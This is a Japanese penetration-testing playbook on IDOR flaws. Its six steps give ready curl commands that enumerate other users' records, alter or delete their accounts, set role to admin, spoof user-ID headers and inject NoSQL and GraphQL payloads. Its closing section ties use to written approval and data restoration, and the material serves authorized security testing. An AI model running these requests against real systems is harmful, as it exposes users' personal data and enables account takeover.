# IDOR（Insecure Direct Object Reference）

## 概要

オブジェクト（ファイル・データ・リソース）への参照に対して認可チェックが適切に実装されておらず、ID・パラメータを操作するだけで他ユーザーのリソースにアクセスできる脆弱性。**認可ロジックの欠如**が根本原因であり、ID が推測困難（UUID 等）でも認可チェックが無ければ IDOR は成立する。

---

## 着火条件

- URL / リクエストパラメータに連番・数値 ID・ユーザー ID・リソース ID が含まれている
- ファイルダウンロード / 画像参照 / API エンドポイントが ID を受け取る
- 「自分のデータ」を返すエンドポイントが URL / クエリ文字列に ID を含む
- API レスポンスに他ユーザーの ID が漏れている（→ UUID でも ID が取れれば試行可能）

---

## 観点・着眼点

### ID の種類別・推測パターン

| ID 種別 | 確認方法 | 着眼点 |
|---|---|---|
| 連番整数（`/data/3`）| `0`, `1`, `2` ...と順次試行 | 最小値（0 / 1）に初期データ・管理者データが多い |
| UUID / GUID | 他エンドポイントのレスポンスから漏れた UUID を集める | UUID 自体は推測困難だが、他 API のレスポンス JSON や `Location:` ヘッダーに他ユーザーの UUID が混入するケースがある |
| タイムスタンプ系（Snowflake / ULID）| 自分の ID の前後 ±1 を試す / 時刻ビット部を変えて試す | 登録順・作成時刻が ID に埋め込まれているため前後ユーザーのリソースが狙える |
| Base64 エンコード | `echo "3" \| base64`（`Mw==`）→ デコードして確認 | エンコードされているだけで内部は整数 ID のことが多い |
| ハッシュ（MD5 / SHA1 系）| 自分のメール / ユーザー名を同じロジックでハッシュして試行 | 固定入力からハッシュが計算される場合は推測可能 |

### 攻撃軸の分類

**直接 ID 変更（Classic IDOR）** 以外にも以下の手段で認可バイパスが成立することがある:

| 攻撃軸 | 概要 | 試行例 |
|---|---|---|
| **HTTP メソッド改変** | GET は認可チェックあり、PUT / DELETE / PATCH は実装が漏れているケース | `GET /api/users/42` → 403 でも `PUT /api/users/42` で更新が通る |
| **ID 上書きヘッダー** | プロキシ / 内部転送用のヘッダーでユーザー ID を上書きできる場合 | `X-User-Id: 1` / `X-Original-User: admin` / `X-Forwarded-User: [USER]` / `Referer` / `Origin` ヘッダーにターゲット ID を入れる |
| **HPP（HTTP Parameter Pollution）** | 同名パラメータを複数送ると、一部の実装で後勝ち / 先勝ち / 配列化の挙動差が出る | `GET /api/data?id=[MY_ID]&id=[TARGET_ID]` |
| **JSON 配列インジェクション** | リクエスト JSON でスカラーを配列に変えると、コレクション全体が返るケース | `{"id": [MY_ID, TARGET_ID]}` / `{"id": [TARGET_ID]}` |
| **NoSQL ライクな演算子注入** | `{"id": {"$ne": 0}}` 等でフィルタを迂回（MongoDB / Mongoose 等） | `{"user_id": {"$gt": 0}}` で全件取得 |
| **GraphQL `node(id:)` 経路** | REST で IDOR が防がれていても GraphQL の `node` インターフェースが ID 直引きになっているケース | `{ node(id: "[BASE64_GLOBAL_ID]") { ... on User { email } } }` |
| **パスパラメータ vs クエリパラメータの認可分岐** | パスに ID を含む場合と、クエリ文字列に ID を含む場合で認可ロジックが別実装 | `/api/users/[MY_ID]/files?target_user=[TARGET_ID]` |
| **Wildcard / glob マッチ悪用** | `*` や `%` をパラメータに入れると内部でワイルドカード評価されて全件返す | `GET /api/reports?name=*` |

**攻撃者の思考トレース:** IDOR の本質は「ID を変えるだけ」ではなく「**認可チェックがどこに実装されているか（または実装されていないか）**を探す」作業。メソッドを変える / ヘッダーを変える / JSON 構造を変える / GraphQL 経由に切り替えるの 4 軸で認可の穴を探す。

---

## 手順

**Step 1: 自分の ID を確認する**

```bash
# [Attacker] 自分のアカウントでエンドポイントを叩いて ID を確認
curl -s http://[TARGET]/api/v1/user/profile \
  -H "Authorization: Bearer [MY_TOKEN]" | jq .id

# API レスポンス全体に他ユーザーの ID が漏れていないか確認
curl -s http://[TARGET]/api/v1/feed \
  -H "Authorization: Bearer [MY_TOKEN]" | jq '.. | .user_id? // empty'
```

**Step 2: 直接 ID 操作（Classic IDOR）**

```bash
# [Attacker] 連番 ID を順次試行
for i in $(seq 0 20); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    http://[TARGET]/api/v1/data/$i \
    -H "Authorization: Bearer [MY_TOKEN]")
  size=$(curl -s -o /tmp/idor_$i -w "%{size_download}" \
    http://[TARGET]/api/v1/data/$i \
    -H "Authorization: Bearer [MY_TOKEN]")
  echo "ID $i : $status ($size bytes)"
done
# 自分の ID 以外で 200 + ボディサイズが 0 以上 → IDOR 成立

# [Attacker] ファイルダウンロード系（バイナリ対応）
curl -s http://[TARGET]/download/1 \
  -H "Cookie: session=[MY_SESSION]" -o file_id1 && file file_id1
```

**Step 3: HTTP メソッド改変**

```bash
# [Attacker] GET で 403 の場合、他メソッドに切り替えて試行
curl -X PUT  http://[TARGET]/api/v1/users/[TARGET_ID] \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}'
curl -X DELETE http://[TARGET]/api/v1/users/[TARGET_ID] \
  -H "Authorization: Bearer [MY_TOKEN]"
curl -X PATCH  http://[TARGET]/api/v1/users/[TARGET_ID] \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Step 4: ID 上書きヘッダーの試行**

```bash
# [Attacker] 自分のエンドポイントに対してヘッダーでターゲット ID を注入
curl -s http://[TARGET]/api/v1/me/data \
  -H "Authorization: Bearer [MY_TOKEN]" \
  -H "X-User-Id: [TARGET_ID]"

# よくある上書きヘッダー候補
for hdr in "X-User-Id" "X-Original-User" "X-Forwarded-User" "X-Authenticated-User" \
           "X-User" "X-Custom-User-Id" "X-Remote-User"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    http://[TARGET]/api/v1/me/data \
    -H "Authorization: Bearer [MY_TOKEN]" \
    -H "$hdr: [TARGET_ID]")
  echo "$hdr: $status"
done
```

**Step 5: HPP / JSON 配列 / NoSQL 演算子**

```bash
# [Attacker] HPP — 同名パラメータを 2 個送る
curl -s "http://[TARGET]/api/v1/data?id=[MY_ID]&id=[TARGET_ID]" \
  -H "Authorization: Bearer [MY_TOKEN]"

# [Attacker] JSON 配列インジェクション
curl -s -X POST http://[TARGET]/api/v1/data \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"id": ["[MY_ID]", "[TARGET_ID]"]}'

# [Attacker] NoSQL 演算子注入
curl -s -X POST http://[TARGET]/api/v1/data \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d '{"user_id": {"$ne": "[MY_ID]"}}'
```

**Step 6: GraphQL 経路**

```bash
# [Attacker] GraphQL の node インターフェースで ID 直引き
# Global ID は通常 Base64([TypeName]:[integer_id]) の形式
TARGET_GLOBAL_ID=$(echo -n "User:[TARGET_INT_ID]" | base64)
curl -s -X POST http://[TARGET]/graphql \
  -H "Authorization: Bearer [MY_TOKEN]" -H "Content-Type: application/json" \
  -d "{\"query\": \"{ node(id: \\\"$TARGET_GLOBAL_ID\\\") { ... on User { id email role } } }\"}"
```

---

## 発見後の動き

| 取得したリソース | 次のアクション |
|--------------|--------------|
| PCAP（ネットワークキャプチャ） | tshark で認証情報を探す → `../Credential_Discovery.md` |
| テキスト・設定ファイル / JSON | 認証情報・内部情報を確認 → `../Credential_Discovery.md` |
| バイナリ・実行ファイル | 解析する → `../Binary_Analysis.md` |
| 他ユーザーの PII（メール / 電話 / 住所）| finding として記録・原状回復不要だが取得データの扱いに注意 |
| 管理者権限付与 / ロール変更成功 | 権限昇格 finding → `../../03_Post_Access_Linux/Enumeration_Checklist.md` または `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md` |

---

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 次の手 |
|---|---|---|
| 自分の ID 以外で全て 403 | 認可チェックが適切に実装されている | メソッド改変 / ヘッダー上書き / HPP / JSON 配列を試す |
| 200 返るが全て自分のデータと同じ内容 | ID とは無関係にセッションで返している（認可チェックが別軸）| リクエスト中のトークン / Cookie の ID 部分を Burp Repeater で確認 |
| ID が UUID 形式で連番推測困難 | 推測よりも漏洩から ID を取得 | 他 API レスポンス / WebSocket メッセージ / `Location:` ヘッダー / GraphQL イントロスペクション等で有効 UUID を収集 |
| GET で 403 / PUT / DELETE / PATCH で 405 | メソッド自体が許可されていない | OPTIONS リクエストで許可メソッド確認: `curl -X OPTIONS http://[TARGET]/api/v1/users/[ID]` |
| GraphQL で `null` 返す | global ID の Base64 フォーマット不一致 | `[TypeName]:[ID]` の TypeName を GraphQL イントロスペクションで確認 |
| `{"$ne": ...}` 形式で 400 / エラー | NoSQL ではなく RDB バックエンド / 演算子がサニタイズされている | 他の攻撃軸へ |
| 全ての試行で 401 | セッション / トークン切れ | 再ログインして Cookie / Bearer 更新後に再試行 |

---

## 注意点・落とし穴

- **ID 推測よりも漏洩 ID の収集が先**: UUID / GUID は推測困難だが、同アプリの他エンドポイントのレスポンスに他ユーザーの ID が混入することが多い。API の全レスポンスを Burp で収集し `jq '.. | .[\"user_id\", \"file_id\", \"id\"]? // empty'` で ID を一括抽出するのが効率的
- **ステータスコードだけでなくレスポンスサイズを見る**: `403` でも Body にデータが入っているケースがある（認可チェックと返却処理が分離している実装ミス）
- **自分の ID を起点に前後を試す**: タイムスタンプ系 ID は自分の ID の前後数件に意味のあるデータがあることが多い
- セッション Cookie やトークンが必要な場合は `-H "Cookie: ..."` / `-H "Authorization: Bearer ..."` を追加すること

---

## 本番での前提

- **事前合意の要否**: ★（ID 変更のみなら技術的判断で実施可）/ ★★★（他ユーザーの個人情報取得・権限昇格は書面承認必須）
- **業務影響リスク**: 低（読み取り系のみなら変更なし）。PUT / DELETE で実際に変更した場合は原状回復必須
- **原状回復必須項目**: ✅ HTTP メソッド改変で変更したデータを元の値に戻す
- **取得情報の取扱**: 取得した他ユーザー PII は暗号化保管・テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web 列挙で ID を含む URL を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 関連：Web レスポンスのトリアージで ID 漏洩を検出 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：PCAP ファイルが取得できた → `../Credential_Discovery.md`
- 後：バイナリが取得できた → `../Binary_Analysis.md`
- 後：認証バイパス / JWT 操作との連鎖 → `./JWT_Attacks.md`
- 関連：パストラバーサル（同じ「ファイルアクセス」系の脆弱性） → `./Path_Traversal.md`
- 関連：GraphQL イントロスペクション・エンドポイント発見 → `../../01_Reconnaissance/Web_Enumeration.md`
